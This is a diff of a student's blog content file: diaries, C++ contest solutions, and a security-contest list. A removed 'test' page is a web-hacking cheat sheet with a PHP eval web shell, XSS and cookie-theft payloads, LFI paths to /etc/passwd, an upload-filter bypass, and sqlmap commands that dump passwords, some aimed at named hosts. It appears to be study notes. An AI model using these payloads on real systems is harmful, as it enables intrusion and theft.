-<li><em>成大找教授</em> &#x2F; <em>LLM課程</em></li>
-</ul>
-<hr>
-<h1 id="Week-17-7-7-7-13"><a href="#Week-17-7-7-7-13" class="headerlink" title="Week 17(7&#x2F;7~7&#x2F;13)"></a>Week 17(7&#x2F;7~7&#x2F;13)</h1><ul>
-<li><em>HITCON工人見面</em> </li>
-<li>AIS3錄取啦!😍</li>
-</ul>
-<hr>
-<h1 id="Week-18-7-14-7-20"><a href="#Week-18-7-14-7-20" class="headerlink" title="Week 18(7&#x2F;14~7&#x2F;20)"></a>Week 18(7&#x2F;14~7&#x2F;20)</h1><ul>
-<li><em>social designer複賽</em></li>
-</ul>
-<hr>
-<h1 id="Week-19-7-21-7-27"><a href="#Week-19-7-21-7-27" class="headerlink" title="Week 19(7&#x2F;21~7&#x2F;27)"></a>Week 19(7&#x2F;21~7&#x2F;27)</h1><ul>
-<li><em>YTP</em> &#x2F; <em>颱風超大</em></li>
-</ul>
-<hr>
-<h1 id="Week-20-7-28-8-3"><a href="#Week-20-7-28-8-3" class="headerlink" title="Week 20(7&#x2F;28~8&#x2F;3)"></a>Week 20(7&#x2F;28~8&#x2F;3)</h1><ul>
-<li><em>AIS3</em></li>
-</ul>
-<hr>
-<h1 id="Goal-for-next-week"><a href="#Goal-for-next-week" class="headerlink" title="Goal for next week"></a>Goal for next week</h1><hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hmxpacfo&nd=6&style=11" border="0" alt="網站計數器"></a></p>
-<!-- End of CuterCounter Code -->]]></content>
-      <categories>
-        <category>紀錄</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>日常刷題</title>
-    <url>/zj-code/</url>
-    <content><![CDATA[<p>有空再更新</p>
-<h2 id="m370"><a href="#m370" class="headerlink" title="m370"></a>m370</h2><details>
-  <summary>
-    <span style="font-weight:bold;font-size:22px">code</span>
-    <span style="color:green;font-weight:bold; font-size:22px"> AC(3ms, 352KB)</span>
-  </summary>
-
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="type">int</span> x,n,a,l=<span class="number">0</span>,r=<span class="number">0</span>,mn=<span class="number">105</span>,mx=<span class="number">-105</span>;</span><br><span class="line">	cin&gt;&gt;x&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">		cin&gt;&gt;a;</span><br><span class="line">		<span class="keyword">if</span>(a&gt;x) r++,mx=<span class="built_in">max</span>(mx,a);</span><br><span class="line">		<span class="keyword">else</span> l++,mn=<span class="built_in">min</span>(mn,a);</span><br><span class="line">	&#125;</span><br><span class="line">	(l&gt;r)?cout&lt;&lt;l&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mn:cout&lt;&lt;r&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mx;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</details>
-
-<hr>
-<h2 id="m931"><a href="#m931" class="headerlink" title="m931"></a>m931</h2><details>
-  <summary>
-    <span style="font-weight:bold;font-size:22px">code</span>
-    <span style="color:green;font-weight:bold; font-size:22px"> AC(2ms, 364KB)</span>
-  </summary>
-  
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> n,mx=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; v;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    v.<span class="built_in">resize</span>(<span class="number">3</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;v[<span class="number">0</span>][i]&gt;&gt;v[<span class="number">1</span>][i];</span><br><span class="line">        v[<span class="number">2</span>][i]=(v[<span class="number">0</span>][i])*(v[<span class="number">0</span>][i])+(v[<span class="number">1</span>][i])*(v[<span class="number">1</span>][i]);</span><br><span class="line">        <span class="keyword">if</span>(v[<span class="number">2</span>][i]&gt;mx) mx=v[<span class="number">2</span>][i],tmp=i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">2</span>][tmp]=<span class="number">0</span>,mx=<span class="number">0</span>,tmp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v[<span class="number">2</span>][i]&gt;mx) mx=v[<span class="number">2</span>][i],tmp=i;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;v[<span class="number">0</span>][tmp]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;v[<span class="number">1</span>][tmp];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</details>
-
-<hr>
-<h2 id="m932"><a href="#m932" class="headerlink" title="m932"></a>m932</h2><details>
-  <summary>
-    <span style="font-weight:bold;font-size:22px">code</span>
-    <span style="color:green;font-weight:bold; font-size:22px"> AC(2ms, 368KB)</span>
-  </summary>
-  
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);cin.<span class="built_in">tie</span>(<span class="number">0</span>); <span class="comment">//IO優化</span></span><br><span class="line">    vector&lt;vector&lt;<span class="type">char</span>&gt;&gt; v; </span><br><span class="line">    <span class="type">bool</span> t[<span class="number">123</span>]=&#123;<span class="number">0</span>&#125;;    <span class="comment">//統計用陣列 (輸出第二行時用的到)</span></span><br><span class="line">    <span class="type">int</span> m,n,k,d;        <span class="comment">//m,n,k為題目敘述 d代表的是input最後一行的整數</span></span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="type">int</span> nowx=m<span class="number">-1</span>,nowy=<span class="number">0</span>,cnt=<span class="number">0</span>;      <span class="comment">//nowx,nowy記錄現在位置的x和y cnt記錄種類</span></span><br><span class="line">    v.<span class="built_in">resize</span>(m,<span class="built_in">vector</span>&lt;<span class="type">char</span>&gt;(n));    <span class="comment">//動態開記憶體</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;           <span class="comment">//把string丟進char陣列裡</span></span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">            v[i][j]=s[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">                              </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;k;i++)&#123;    <span class="comment">//先判斷現在往哪個方向 再判斷if(沒超過邊界)就更新現在位置;</span></span><br><span class="line">        cin&gt;&gt;d;</span><br><span class="line">        <span class="keyword">if</span>(d==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowx--; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowy<span class="number">+1</span>)&lt;n) nowy++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">+1</span>)&lt;m&amp;&amp;(nowy<span class="number">+1</span>)&lt;n) nowx++,nowy++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">+1</span>)&lt;m) nowx++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowy<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowy--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(d==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((nowx<span class="number">-1</span>)&gt;=<span class="number">0</span>&amp;&amp;(nowy<span class="number">-1</span>)&gt;=<span class="number">0</span>) nowx--,nowy--;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;v[nowx][nowy]; </span><br><span class="line">        t[(<span class="type">int</span>)(v[nowx][nowy])]=<span class="number">1</span>;     <span class="comment">//這邊使用ASCII 轉成int 丟到陣列</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="string">&#x27;A&#x27;</span>;i&lt;=<span class="string">&#x27;Z&#x27;</span>;i++)&#123;         <span class="comment">//跑陣列 統計多少種類</span></span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="number">1</span>) cnt++;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="string">&#x27;a&#x27;</span>;i&lt;=<span class="string">&#x27;z&#x27;</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t[i]==<span class="number">1</span>) cnt++;        </span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;\n&quot;</span>&lt;&lt;cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</details>
-
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hvxocncq&nd=6&style=11" border="0" alt="網頁計數器"></a></p>
-<!-- End of CuterCounter Code -->]]></content>
-      <categories>
-        <category>zerojudge</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>電資類競賽分享</title>
-    <url>/sources-share/</url>
-    <content><![CDATA[<h2 id="主要競賽-具指標性"><a href="#主要競賽-具指標性" class="headerlink" title="主要競賽(具指標性):"></a>主要競賽(具指標性):</h2><p>競程類</p>
-<ul>
-<li><a href="https://apcs.csie.ntnu.edu.tw/" style="color: #0066CC;">⭐APCS</a></li>
-<li><a href="https://tpmso.org/toi/" style="color: #0066CC;">⭐TOI</a></li>
-<li><a href="https://contest.cc.ntu.edu.tw/npsc2023/index.html" style="color: #0066CC;">NPSC</a></li>
-<li><a href="https://cpe.cse.nsysu.edu.tw/" style="color: #0066CC;">⭐CPE</a></li>
-<li><a href="https://www.tw-ytp.org/" style="color: #0066CC;">YTP</a></li>
-<li>⭐資訊學科能力競賽<ul>
-<li>校內初賽前2名可參加複賽</li>
-<li>複賽前幾名可參加全國賽(決賽)</li>
-</ul>
-</li>
-<li><a href="https://e-tutor.itsa.org.tw/e-Tutor/" style="color: #0066CC;">ITSA</a></li>
-<li><a href="https://issc.csroc.org.tw/" style="color: #0066CC;">ISSC</a></li>
-<li><a href="https://www.hpcodewars.com.tw/" style="color: #0066CC;">HP CodeWars</a></li>
-<li><a href="https://hspc.csie.ncku.edu.tw/" style="color: #0066CC;">HSPC(成大暑期程式邀請賽)</a></li>
-</ul>
-<p>資安類</p>
-<ul>
-<li><a href="https://csc.nics.nat.gov.tw/" style="color: #0066CC;">⭐金盾獎</a></li>
-<li><a href="https://tcat2023.twisc.ncku.edu.tw/" style="color: #0066CC;">T貓盃</a></li>
-<li><a href="https://ais3.org/eof/" style="color: #0066CC;">⭐AIS3 EOF</a></li>
-<li><a href="https://gics.tw/" style="color: #0066CC;">尋找資安女婕思</a></li>
-<li><a href="https://ais3.org/mfctf/" style="color: #0066CC;">MyFirstCTF</a></li>
-<li><a href="https://ais3.org/" style="color: #0066CC;">⭐AIS3</a></li>
-</ul>
-<p>AI類</p>
-<ul>
-<li><a href="https://www.aicup.tw/" style="color: #0066CC;">AI CUP</a></li>
-</ul>
-<hr>
-<p>年會</p>
-<ul>
-<li><p><a href="https://sitcon.org/2024/" style="color: #0066CC;">SITCON 學生計算機年會</a></p>
-</li>
-<li><p><a href="https://hitcon.org/2024/CMT/" style="color: #0066CC;">HITCON 台灣駭客年會</a></p>
-</li>
-<li><p><a href="https://coscup.org/2024/zh-TW/landing" style="color: #0066CC;">COSCUP 開源人年會</a></p>
-</li>
-<li><p><a href="https://summit.g0v.tw/2024/" style="color: #0066CC;">g0v summit 零時政府雙年會</a></p>
-</li>
-<li><p><a href="https://summit.g0v.tw/2024/" style="color: #0066CC;">g0v summit 零時政府雙年會</a></p>
-</li>
-</ul>
-<p>社群</p>
-<ul>
-<li><a href="https://discord.gg/3fah53Bj46" style="color: #0066CC;">SCINT 北台灣學生資訊社群(北電)</a></li>
-<li><a href="https://discord.gg/R7uguV73tC" style="color: #0066CC;">SCAICT 中電會(中電)</a></li>
-<li><a href="https://discord.gg/g6qfD4Wk9j" style="color: #0066CC;">SCIST (南電)</a></li>
-</ul>
-<hr>
-<h2 id="其他資料"><a href="#其他資料" class="headerlink" title="其他資料:"></a>其他資料:</h2><ul>
-<li><a href="https://hackmd.io/@cube/rJ3o-G1mF" style="color: #0066CC;">程式設計競賽網路資源</a></li>
-<li><a href="https://github.com/goodjack/awesome-cs-training" style="color: #0066CC;">資訊培訓相關資源彙整</a></li>
-<li><a href="https://hackmd.io/@nehs-iced-7th/Skut4WffY" style="color: #0066CC;">實中資研整理</a></li>
-<li><a href="https://hackmd.io/@yuan-tw/SJHj8Xano" style="color: #0066CC;">電資資源整理(不定期更新)</a></li>
-<li><a href="https://github.com/Ice1187/TW-Security-and-CTF-Resource" style="color: #0066CC;">台灣資安 &#x2F; CTF 學習資源整理</a></li>
-</ul>
-<hr>
-<!-- Start of CuterCounter Code -->
-<p><a href="https://www.cutercounter.com/traditional-chinese-nn/" target="_blank" style="pointer-events: none;"><img src="https://www.cutercounter.com/hits.php?id=hrvxocncc&nd=6&style=11" border="0" alt="免費網站計數器"></a></p>
-<!-- End of CuterCounter Code -->]]></content>
-      <categories>
-        <category>資源分享</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Practise Web Security</title>
     <url>/practise_web/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嗨，我是<a href="https://chewu.tw/about">che</a>!<br>這篇是我在 pwn.college的資安練習紀錄，想說這平台題目很優質，但網路上都沒人寫write-up，所以我才決定寫這篇，沒想到在寫完後才發現，他們其實有提到不建議公開 write-up…<br><img src="https://hackmd.io/_uploads/BkloRr9xle.png" alt="image"> 唉，虧我這麼辛苦寫完 QQ<br>不過反正我的網站也沒什麼流量 (X)，所以我還是決定發佈這篇 blog。為了尊重原團隊的聲明，我已經將此篇SEO設為 <code>false</code>，並且標題與網址中皆未直接tag關鍵字，應該是很難透過google直接找到這篇。</p>
@@ -1995,7 +1759,7 @@ ABaB
 <li>Neither the title nor the URL includes any sensitive keywords.</li>
 <li>It’s very unlikely for someone to find this post via Google or other search engines.</li>
 </ul>
-<h2 id="If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-121-108-x61-110-x2e-106-x63-x32-x32-50-x32-64-x67-109-97-x69-x6c-46-99-111-x6d-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding"><a href="#If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-121-108-x61-110-x2e-106-x63-x32-x32-50-x32-64-x67-109-97-x69-x6c-46-99-111-x6d-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding" class="headerlink" title="If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at &#100;&#121;&#108;&#x61;&#110;&#x2e;&#106;&#x63;&#x32;&#x32;&#50;&#x32;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#x6d; — I will remove it promptly upon request.To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!"></a>If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at <a href="mailto:&#100;&#121;&#108;&#x61;&#110;&#x2e;&#106;&#x63;&#x32;&#x32;&#50;&#x32;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#100;&#121;&#108;&#x61;&#110;&#x2e;&#106;&#x63;&#x32;&#x32;&#50;&#x32;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;</a> — I will remove it promptly upon request.<br>To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!</h2><h1 id="解說"><a href="#解說" class="headerlink" title="解說"></a>解說</h1><p>平台上的題目跟一般的CTF不太一樣，一般CTF是連去指定的ip做操作，但是這平台上的題目是會開啟虛擬機並讓你以一般使用者的帳號，通過web去取得&#x2F;flag的檔案，而他給的web都是用root權限的，也就是說，你必須透過自行啟用web的python檔案，並在這個web上透過漏洞而以root身分取得&#x2F;flag的檔案。</p>
+<h2 id="If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-x79-x6c-x61-x6e-46-x6a-99-x32-50-x32-50-64-x67-109-97-105-x6c-x2e-x63-x6f-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding"><a href="#If-you-are-a-member-of-the-pwn-college-team-and-would-prefer-this-post-to-be-taken-down-please-contact-me-at-100-x79-x6c-x61-x6e-46-x6a-99-x32-50-x32-50-64-x67-109-97-105-x6c-x2e-x63-x6f-109-—-I-will-remove-it-promptly-upon-request-To-any-readers-who-happen-to-find-this-post-please-refrain-from-widely-sharing-it-with-others-Thanks-for-your-understanding" class="headerlink" title="If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at &#100;&#x79;&#x6c;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#50;&#x32;&#50;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109; — I will remove it promptly upon request.To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!"></a>If you are a member of the pwn.college team and would prefer this post to be taken down, please contact me at <a href="mailto:&#100;&#x79;&#x6c;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#50;&#x32;&#50;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#100;&#x79;&#x6c;&#x61;&#x6e;&#46;&#x6a;&#99;&#x32;&#50;&#x32;&#50;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a> — I will remove it promptly upon request.<br>To any readers who happen to find this post, please refrain from widely sharing it with others. Thanks for your understanding!</h2><h1 id="解說"><a href="#解說" class="headerlink" title="解說"></a>解說</h1><p>平台上的題目跟一般的CTF不太一樣，一般CTF是連去指定的ip做操作，但是這平台上的題目是會開啟虛擬機並讓你以一般使用者的帳號，通過web去取得&#x2F;flag的檔案，而他給的web都是用root權限的，也就是說，你必須透過自行啟用web的python檔案，並在這個web上透過漏洞而以root身分取得&#x2F;flag的檔案。</p>
 <h1 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h1><p>pwn.college網路上都找不到write up，花了很多時間在深入研究bypass，但也學到很多xd，以下進入正題。</p>
 <hr>
 <h1 id="Path-Traversal-1"><a href="#Path-Traversal-1" class="headerlink" title="Path Traversal 1"></a>Path Traversal 1</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This level will explore the intersection of Linux path resolution, when done naively, and unexpected web requests from an attacker. We&#x27;ve implemented a simple web server for you --- it will serve up files from /challenge/files over HTTP. Can you trick it into giving you the flag?</span><br><span class="line"></span><br><span class="line">The webserver program is /challenge/server. You can run it just like any other challenge, then talk to it over HTTP (using a different terminal or a web browser). We recommend reading through its code to understand what it is doing and to find the weakness!</span><br><span class="line"></span><br><span class="line">HINT: If you&#x27;re wondering why your solution isn&#x27;t working, make sure what you&#x27;re trying to query is what is actually being received by the server! curl -v [url] can show you the exact bytes that curl is sending over.</span><br></pre></td></tr></table></figure>
@@ -2300,52 +2064,292 @@ ABaB
       </categories>
   </entry>
   <entry>
-    <title>測試用</title>
-    <url>/ss/</url>
-    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>隱藏的檔案</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/robots.txt </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/git (網頁上看到 Forbidden(403) 通常都是 有這個資料夾)</span><br><span class="line">/.git/index</span><br><span class="line"></span><br><span class="line">git clone https://github.com/BugScanTeam/GitHack.git</span><br><span class="line">執行githack.py</span><br><span class="line"></span><br><span class="line">ex: python2 GitHack.py https://140.134.25.138:10005/.git/</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.DS_Store</span><br><span class="line"></span><br><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line"></span><br><span class="line">ex: python2 ds_store_exp.py 140.134.25.138:10006/.DS_Store</span><br></pre></td></tr></table></figure>
-<p>暴力目錄遍歷</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb 網址</span><br></pre></td></tr></table></figure>
-<p>port掃描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -p- -v -T4 (IP)</span><br></pre></td></tr></table></figure>
-<p>網站弱點掃描(kali內建)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 網址 -o 輸出檔案(不選擇輸出在終端機上)</span><br><span class="line"></span><br><span class="line">ex: nikto -h https://innopac.lib.fcu.edu.tw/ -o result.html</span><br></pre></td></tr></table></figure>
-
-
-<p>查找封包原始內容 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查Way Back Machine，輸入ip+port</span><br></pre></td></tr></table></figure>
-
+    <title>程式週記</title>
+    <url>/weekly-diary/</url>
+    <content><![CDATA[<h1 id="Week-1-3-17-3-23"><a href="#Week-1-3-17-3-23" class="headerlink" title="Week 1 (3&#x2F;17~3&#x2F;23)"></a>Week 1 (3&#x2F;17~3&#x2F;23)</h1><ul>
+<li>APP (week1)<ul>
+<li>Still searching for a reasonable UI&#x2F;UX</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>Learn Dart syntax <ul>
+<li>so mind-twisting@@</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Web<ul>
+<li>週記ing</li>
+<li>Encryption algorithm <ul>
+<li>html</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 <hr>
-<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>會把整個頁面的head全刪除，留下一句Hacked就跑了<br>(勿試)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.getElementsByTagName(&#x27;body&#x27;)[0].innerHTML=&quot;Hacked&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>Dom XSS(?<br>圖片語法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;才不存在呢&quot; onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>實戰偷cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure>
-
-<p>實作偷別人的cookie教學<br>(勿試)<br><code>https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1</code></p>
+<h1 id="Week-2-3-24-3-30"><a href="#Week-2-3-24-3-30" class="headerlink" title="Week 2(3&#x2F;24~3&#x2F;30)"></a>Week 2(3&#x2F;24~3&#x2F;30)</h1><ul>
+<li><em>School midterm exam</em></li>
+<li>Programming Contest<ul>
+<li>CPE</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++ <ul>
+<li>Proficient in bit operations</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
 <hr>
-<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">page=c:/Windows/System32/drivers/etc/hosts</span><br><span class="line">page=/etc/passwd</span><br></pre></td></tr></table></figure>
+<h1 id="Week-3-3-31-4-6"><a href="#Week-3-3-31-4-6" class="headerlink" title="Week 3(3&#x2F;31~4&#x2F;6)"></a>Week 3(3&#x2F;31~4&#x2F;6)</h1><ul>
+<li><em>Earthquake</em></li>
+<li>Programming Contest<ul>
+<li>AI CUP</li>
+</ul>
+</li>
+<li>Programming language<ul>
+<li>C++ (CSES)</li>
+</ul>
+</li>
+</ul>
 <hr>
-<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>php木馬</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval($_GET[CMD]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">(要執行的時候就hack.php?CMD=phpinfo())</span><br></pre></td></tr></table></figure>
-
-<p>上傳檔案如果有鎖副檔名，用burpsuite:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">轉</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
-
-<h2 id="b374k，後門phpXST"><a href="#b374k，後門phpXST" class="headerlink" title="b374k，後門phpXST"></a>b374k，後門php<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">檔案存在kali桌面了</span><br></pre></td></tr></table></figure><br>XST<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></h2><p>SQL injection</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 注入点 检测注入点是否可用</span><br><span class="line">sqlmap -u 注入点 –batch 自动输入</span><br><span class="line">暴库</span><br><span class="line">sqlmap -u 注入点 –dbs //暴库</span><br><span class="line">Web当前使用的数据库</span><br><span class="line">sqlmap -u 注入点 –current-db //爆当前使用的库</span><br><span class="line">Web数据库使用的账户</span><br><span class="line">sqlmap -u 注入点 –current-user //当前使用的账户</span><br><span class="line">列出sqlserver所有用户</span><br><span class="line">sqlmap -u 注入点 –users // 列出所有使用过的账户</span><br><span class="line">数据库账户与密码</span><br><span class="line">sqlmap -u 注入点 –passwords //mysql的登录账户和密码</span><br><span class="line">列出数据库中的表</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 –tables //(-D指定数据库名称)</span><br><span class="line">列出表中字段</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定的表名 –columns</span><br><span class="line">爆字段内容</span><br><span class="line">sqlmap -u 注入点 -D 指定数据库名 -T 指定表名 -C “email,username,userpassword” –dump (将结果导出)</span><br><span class="line">指定导出特定范围字段内容</span><br><span class="line">sqlmap -u注入点-D tourdata -T userb -C “email,username,userpassword”–start 1 –stop 10 –dump (1,10行数)</span><br><span class="line">Cookie注入</span><br><span class="line">sqlmap -u “注入点” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –table –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">sqlmap -u “注入点” –dump -C “username,password”–columns -T “user” –cookie “id=97” –level 2</span><br><span class="line">可对以上参数进行结合使用</span><br><span class="line">python sqlmap.py -u “注入点” -f –banner –dbs –users</span><br><span class="line"></span><br><span class="line">post登陆注入 mssql</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http://” –data “tfUName=12345&amp;tfUPass=12345”</span><br><span class="line"></span><br><span class="line">sqlmap.py -u “http:” –data “tfUName=12345&amp;tfUPass=12345” –dbs ==获取数据库名</span><br><span class="line"></span><br><span 